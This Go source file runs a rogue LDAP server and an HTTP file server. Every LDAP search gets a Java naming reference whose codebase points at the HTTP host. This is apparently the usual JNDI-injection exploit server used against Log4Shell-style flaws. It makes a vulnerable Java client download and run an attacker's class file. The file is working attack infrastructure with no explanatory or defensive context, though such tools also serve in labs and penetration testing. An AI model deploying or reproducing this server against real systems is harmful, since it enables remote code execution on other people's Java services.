package main

import (
    "log"
    "fmt"
    "os"
    "os/signal"
    "syscall"
    "net/http"
    "strings"
    ldapMsg "github.com/lor00x/goldap/message"
    ldap "github.com/vjeantet/ldapserver"
)

func main() {
    ldap.Logger = log.New(os.Stdout, "[server] ", log.LstdFlags)

    server := ldap.NewServer()

    filesHost := os.Getenv("HOST")

    routes := ldap.NewRouteMux()
    routes.Bind(handleBind)
    routes.Search(func(w ldap.ResponseWriter, m *ldap.Message) {
        r := m.GetSearchRequest()
    
        className := fmt.Sprintf("%s", r.BaseObject())
        codebase := fmt.Sprintf("http://%s:8080/", filesHost)

        e := ldap.NewSearchResultEntry(className)
        e.AddAttribute("javaClassName", ldapMsg.AttributeValue(className));
        e.AddAttribute("javaFactory", ldapMsg.AttributeValue(className));
        e.AddAttribute("javaCodeBase", ldapMsg.AttributeValue(codebase));
        e.AddAttribute("objectClass", "javaNamingReference");
        w.Write(e)
    
        res := ldap.NewSearchResultDoneResponse(ldap.LDAPResultSuccess)
        w.Write(res)
    })
    server.Handle(routes)

    go server.ListenAndServe(":1389")
    go func() {
        mux := http.NewServeMux()
        fileServer := http.FileServer(http.Dir("/files"))
        mux.Handle("/", http.StripPrefix("/", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            if strings.HasSuffix(r.URL.Path, "/") {
                http.NotFound(w, r)
                return
            }
    
            fileServer.ServeHTTP(w, r)
        })))
        http.ListenAndServe(":8080", mux)
    }()

    ch := make(chan os.Signal)
    signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
    <-ch
    close(ch)

    server.Stop()
}

func handleBind(w ldap.ResponseWriter, m *ldap.Message) {
    res := ldap.NewBindResponse(ldap.LDAPResultSuccess)
    w.Write(res)
}